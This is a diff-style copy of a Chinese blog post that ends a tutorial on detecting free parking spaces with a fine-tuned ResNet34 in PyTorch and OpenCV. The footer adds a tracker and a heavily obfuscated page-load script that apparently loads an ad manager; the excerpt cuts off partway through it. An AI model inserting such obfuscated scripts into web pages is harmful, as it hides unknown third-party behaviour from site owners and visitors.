+    optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>net<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">0.0001</span><span class="token punctuation">)</span>
+
+    epochs <span class="token operator">=</span> <span class="token number">30</span>
+    save_path <span class="token operator">=</span> <span class="token string">"saved_model_weight/resnet34_pretrain.pth"</span>
+    best_acc <span class="token operator">=</span> <span class="token number">0.</span>
+    train_steps <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_loader<span class="token punctuation">)</span>
+
+    model_train<span class="token punctuation">(</span>net<span class="token punctuation">,</span> train_loader<span class="token punctuation">,</span> validat_loader<span class="token punctuation">,</span> epochs<span class="token punctuation">,</span> device<span class="token punctuation">,</span> optimizer<span class="token punctuation">,</span> loss_function<span class="token punctuation">,</span> train_steps<span class="token punctuation">,</span> val_num<span class="token punctuation">,</span>
+                save_path<span class="token punctuation">,</span> best_acc<span class="token punctuation">)</span>
+</code></pre> 
+<p>因为我这里采用了一些函数封装，所以这个逻辑应该稍微清晰些，首先pytorch模型训练，要先把数据封装成dataloader的格式，后面模型训练的时候，是从这个类里面读取数据。关于dataloader与dataset的原理这里就不过多整理。之前我详细在pytorch基础那里整理过了。</p> 
+<p>不过这里的细节，就是data_transform_pretrain， 也就是数据预处理操作。</p> 
+<pre><code class="prism language-python">data_transform_pretrain <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">"train"</span><span class="token punctuation">:</span> transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>
+            transforms<span class="token punctuation">.</span>RandomResizedCrop<span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># 对图像随机裁剪， 训练集用，验证集不用</span>
+            transforms<span class="token punctuation">.</span>RandomHorizontalFlip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token comment"># 这里的中心化处理参数需要官方给定的参数，这里是ImageNet图片的各个通道的均值和方差，不能随意指定了</span>
+            transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.485</span><span class="token punctuation">,</span> <span class="token number">0.456</span><span class="token punctuation">,</span> <span class="token number">0.406</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.229</span><span class="token punctuation">,</span> <span class="token number">0.224</span><span class="token punctuation">,</span> <span class="token number">0.225</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"val"</span><span class="token punctuation">:</span> transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>
+            <span class="token comment"># 验证过程中，这里也进行了一点点改动</span>
+            transforms<span class="token punctuation">.</span>Resize<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>CenterCrop<span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.485</span><span class="token punctuation">,</span> <span class="token number">0.456</span><span class="token punctuation">,</span> <span class="token number">0.406</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.229</span><span class="token punctuation">,</span> <span class="token number">0.224</span><span class="token punctuation">,</span> <span class="token number">0.225</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"test"</span><span class="token punctuation">:</span> transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>
+            transforms<span class="token punctuation">.</span>Resize<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>CenterCrop<span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.485</span><span class="token punctuation">,</span> <span class="token number">0.456</span><span class="token punctuation">,</span> <span class="token number">0.406</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.229</span><span class="token punctuation">,</span> <span class="token number">0.224</span><span class="token punctuation">,</span> <span class="token number">0.225</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+</code></pre> 
+<p>这里由于是采用的官方训练好的resnet网络，我们这里中心化要参考官方给定的参数，因为它预训练是ImageNet这个大数据集上训练的，所以这里每个通道的均值和方差，我们最好别随意指定。用人家官方给出的。</p> 
+<p>有了dataloader，接下来创建模型， 这里是直接使用的resnet34, 把预训练的模型参数导入进来。导入的时候，会发现我这个参数名字的文件有个<code>low_torch_version</code>， 是因为之前导入的时候出现了报错：</p> 
+<pre><code class="prism language-python">xxx<span class="token punctuation">.</span>pt <span class="token keyword">is</span> a <span class="token builtin">zip</span> archive<span class="token punctuation">(</span>did you mean to use torch<span class="token punctuation">.</span>jit<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>?<span class="token punctuation">)</span>“
+</code></pre> 
+<p>这个报错的原因是，官方预训练保存的模型参数使用的pytorch版本是1.6以上，PyTorch的1.6版本将torch.save切换为使用新的基于zipfile的文件格式。</p> 
+<blockquote> 
+ <p><code>torch.load</code>仍然保留以旧格式加载文件的功能。 如果希望<code>torch.save</code>使用旧格式，请传递<code>kwarg _use_new_zipfile_serialization = False</code>。</p> 
+</blockquote> 
+<p>我电脑本子的pytorch版本是1.0，所以导入1.6以上版本保存的模型参数，就会报这样的错误。 那么，我怎么解决的呢？ 那就是从我服务器上，运行了下面这个代码</p> 
+<pre><code class="prism language-python">model_weight_path <span class="token operator">=</span> <span class="token string">"saved_models/resnet34_pretrain_ori.pth"</span>
+    state_dict <span class="token operator">=</span> torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span>model_weight_path<span class="token punctuation">)</span>
+    torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>state_dict<span class="token punctuation">,</span> <span class="token string">'saved_models/resnet34_pretrain_ori_low_torch_version.pth'</span><span class="token punctuation">,</span> _use_new_zipfile_serialization<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>我服务器上的pytorch版本是1.10的版本，是能导入这个参数的，导入完了重新保存，指定官方给定的参数即可。</p> 
+<p>这个问题解决之后，下面就说下预训练模型了， 导入参数之后，我们需要修改网络最后的一层，因为resnet本身做的是1000分类，最后一层神经元个数是1000，我们这里需要做二分类，所以需要改成2。</p> 
+<p>另外，就是迁移学习的三种方式:</p> 
+<ol>
+<li>载入权重后重新训练所有参数 – 硬件设施好</li>
+<li>载入权重后只训练最后几层参数，前面的层进行冻结， 或者是前面几层的学习率降低， 后面全连接层的学习率变大，即分组调整学习率</li>
+<li>载入全中后在原网络基础上再添加一层全连接层， 仅训练最后一个全连接层</li>
+</ol> 
+<p>我这里采用的全部训练的方式，但是这里有必要整理下，如果是想只训练后面几层，或者前面层和后面层不同学习率训练的时候，应该怎么做：</p> 
+<pre><code class="prism language-python"><span class="token comment"># 创建模型 注意这里没指定类的个数，默认是1000类</span>
+net <span class="token operator">=</span> resnet34<span class="token punctuation">(</span><span class="token punctuation">)</span>
+model_weight_path <span class="token operator">=</span> <span class="token string">'saved_model_weight/resnet34_pretrain_ori_low_torch_version.pth'</span>
+
+<span class="token comment"># 使用预训练的参数，然后进行finetune</span>
+net<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span>model_weight_path<span class="token punctuation">,</span> map_location<span class="token operator">=</span><span class="token string">'cpu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 改变fc layer structure  把fc的输出维度改为2</span>
+in_channel <span class="token operator">=</span> net<span class="token punctuation">.</span>fc<span class="token punctuation">.</span>in_features
+net<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>in_channel<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+net<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>
+
+<span class="token comment"># 模型训练配置</span>
+loss_function <span class="token operator">=</span> nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># 训练的时候，也可以冻结掉卷积层的参数, 也可以指定不同层的参数使用不同的学习率进行训练</span>
+res_params<span class="token punctuation">,</span> conv_params<span class="token punctuation">,</span> fc_params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token comment"># named_parameters()能返回每一层的名字以及参数，是一个字典</span>
+<span class="token keyword">for</span> name<span class="token punctuation">,</span> param <span class="token keyword">in</span> net<span class="token punctuation">.</span>named_parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+     <span class="token comment"># layer 系列是残差层</span>
+     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'layer'</span> <span class="token keyword">in</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+           res_params<span class="token punctuation">.</span>append<span class="token punctuation">(</span>param<span class="token punctuation">)</span>
+     <span class="token comment"># 全连接层</span>
+     <span class="token keyword">elif</span> <span class="token punctuation">(</span><span class="token string">'fc'</span> <span class="token keyword">in</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+           fc_params<span class="token punctuation">.</span>append<span class="token punctuation">(</span>param<span class="token punctuation">)</span>
+     <span class="token keyword">else</span><span class="token punctuation">:</span>
+           param<span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span>
+
+params <span class="token operator">=</span> <span class="token punctuation">[</span>
+     <span class="token punctuation">{<!-- --></span><span class="token string">'params'</span><span class="token punctuation">:</span> res_params<span class="token punctuation">,</span> <span class="token string">'lr'</span><span class="token punctuation">:</span> <span class="token number">0.0001</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+     <span class="token punctuation">{<!-- --></span><span class="token string">'params'</span><span class="token punctuation">:</span> fc_params<span class="token punctuation">,</span> <span class="token string">'lr'</span><span class="token punctuation">:</span> <span class="token number">0.0002</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+
+optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>params<span class="token punctuation">)</span>
+</code></pre> 
+<p>这里修改优化器的参数即可。</p> 
+<p>这样完事之后，调用模型训练的函数，直接进行训练即可。这个脚本就是常规操作了，这里就不贴代码了。</p> 
+<h3>
+<a id="42__521"></a>4.2 模型预测</h3> 
+<p>有了保存好的模型， 我们拿来一帧图像，根据停车位字典划分出一个个的停车位来，然后通过模型预测是不是空的，如果是空的， 在原图上进行标记出来即可。</p> 
+<p>所以下面是整个项目的核心预测：</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">predict_on_img</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span> spot_dict<span class="token punctuation">,</span> model<span class="token punctuation">,</span> class_indict<span class="token punctuation">,</span> make_copy<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> save<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 这个是停车场的全景图像</span>
+    <span class="token keyword">if</span> make_copy<span class="token punctuation">:</span>
+        new_image <span class="token operator">=</span> np<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+        overlay <span class="token operator">=</span> np<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+
+    cnt_empty<span class="token punctuation">,</span> all_spots <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> spot <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>spot_dict<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        all_spots <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> spot
+        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        spot_img <span class="token operator">=</span> img<span class="token punctuation">[</span>y1<span class="token punctuation">:</span>y2<span class="token punctuation">,</span> x1<span class="token punctuation">:</span>x2<span class="token punctuation">]</span>
+        spot_img_pil <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>spot_img<span class="token punctuation">)</span>
+
+        label <span class="token operator">=</span> model_infer<span class="token punctuation">(</span>spot_img_pil<span class="token punctuation">,</span> model<span class="token punctuation">,</span> class_indict<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> label <span class="token operator">==</span> <span class="token string">'empty'</span><span class="token punctuation">:</span>
+            cv2<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span>overlay<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            cnt_empty <span class="token operator">+=</span> <span class="token number">1</span>
+
+    cv2<span class="token punctuation">.</span>addWeighted<span class="token punctuation">(</span>overlay<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> new_image<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> alpha<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> new_image<span class="token punctuation">)</span>
+
+    <span class="token comment"># 显示结果的</span>
+    cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> <span class="token string">"Available: %d spots"</span> <span class="token operator">%</span> cnt_empty<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                cv2<span class="token punctuation">.</span>FONT_HERSHEY_SIMPLEX<span class="token punctuation">,</span>
+                <span class="token number">0.7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+    cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> <span class="token string">"Total: %d spots"</span> <span class="token operator">%</span> all_spots<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                cv2<span class="token punctuation">.</span>FONT_HERSHEY_SIMPLEX<span class="token punctuation">,</span>
+                <span class="token number">0.7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> save<span class="token punctuation">:</span>
+        filename <span class="token operator">=</span> <span class="token string">'with_marking_predict.jpg'</span>
+        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_image<span class="token punctuation">)</span>
+    <span class="token comment"># cv_imshow('new_image', new_image)</span>
+    <span class="token keyword">return</span> new_image
+</code></pre> 
+<p>模型预测的核心，就是model_infer函数，这个也是模型预测的常规操作，这里不过多解释了。</p> 
+<p>视频的话，无非就是多帧图像，对于每一帧过一下这个函数，就能进行视频的实时预测：</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">predict_on_video</span><span class="token punctuation">(</span>video_path<span class="token punctuation">,</span> spot_dict<span class="token punctuation">,</span> model<span class="token punctuation">,</span> class_indict<span class="token punctuation">,</span> ret<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span>video_path<span class="token punctuation">)</span>
+    count <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">while</span> ret<span class="token punctuation">:</span>
+        ret<span class="token punctuation">,</span> image <span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        count <span class="token operator">+=</span> <span class="token number">1</span>
+
+        <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>
+            count <span class="token operator">=</span> <span class="token number">0</span>
+            new_image <span class="token operator">=</span> predict_on_img<span class="token punctuation">(</span>image<span class="token punctuation">,</span> spot_dict<span class="token punctuation">,</span> model<span class="token punctuation">,</span> class_indict<span class="token punctuation">,</span> save<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+            cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'frame'</span><span class="token punctuation">,</span> new_image<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+
+    cv2<span class="token punctuation">.</span>destroyAllWindows<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    cap<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>这就是整个项目啦。</p> 
+<h2>
+<a id="5__588"></a>5. 小结</h2> 
+<p>终于看到了一个小麻雀项目了，虽然可能有些简单，但是却能把图像处理加模型训练预测，这一套机制都给利用起来，对我这样的初学者还算友好。通过这个项目，在图像预处理方面学习到了二值化中的InRange, 霍夫直线检测，定点标定技术，mask矩阵进行区域锁定，以及通过坐标进行区域提取等。在模型方面学习到了resnet，复习了pytorch迁移学习。 又认识了几个新的库glob, shutil, PIL等。所以，收获颇多，感觉cv越来越有意思了哈。</p> 
+<p>这个项目感觉实际场景中挺有意义的，开脑洞幻想下未来如果智慧交通普及了，在智能停车场的运作下， 通过摄像头实时检测停车场车位的空余状况并标定好位置，把这个信息传到无人车系统，然后无人车根据信息自动规划停车路线，直接锁定车位自动把车停好。避免了停车场的拥挤(可能现在我们停车转好几圈找不到一个停车位，还有可能堵死在里面不好出来)。并且停车场的空余情况能通过大屏幕一目了然，节省了用户找车位，停车的时间。</p> 
+<p>好吧， 只是提前开了下脑洞，至于能不能成， 未来会给我们答案 ?</p> 
+<p>本次项目代码地址<a href="https://github.com/zhongqiangwu960812/OpenCVLearning">https://github.com/zhongqiangwu960812/OpenCVLearning</a>， 感兴趣的可以玩一下啦。</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5